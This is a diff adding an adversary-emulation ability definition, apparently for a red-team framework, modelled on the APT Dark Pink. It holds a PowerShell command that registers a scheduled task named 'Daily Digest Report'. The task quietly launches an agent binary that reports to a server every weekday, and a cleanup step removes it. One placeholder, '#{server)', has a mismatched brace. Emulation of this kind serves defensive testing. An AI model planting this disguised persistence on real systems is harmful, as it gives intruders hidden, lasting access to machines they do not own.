@@ -1,0 +1,42 @@
+- tactic: persistence
+  technique_name: 'Scheduled Task/Job: Scheduled Task'
+  technique_id: T1053.005
+  name: Agent Persistence via Scheduled Task (New-ScheduledTask cmdlet)
+  description: 'This ability is derived from the APT Dark Pink. It uses the New-ScheduledTask
+    cmdlet to execute the agent binary every weekday at 09:30AM.
+
+
+    The cleanup command unregisters the scheduled task.'
+  executors:
+  - name: psh
+    platform: windows
+    command: '$action = New-ScheduledTaskAction -Execute "#{location}" -Argument "-server
+      #{server) -group #{group}";
+
+      $trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday, Tuesday, Wednesday,
+      Thursday, Friday -At 09:30AM;
+
+      Register-ScheduledTask -TaskName "Daily Digest Report" -Action $action -Trigger
+      $trigger -Force;'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - Unregister-ScheduledTask -Taskname "Daily Digest Report" -Confirm:$false;
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 381ee532-e000-4c1e-9073-903cb1ed1778
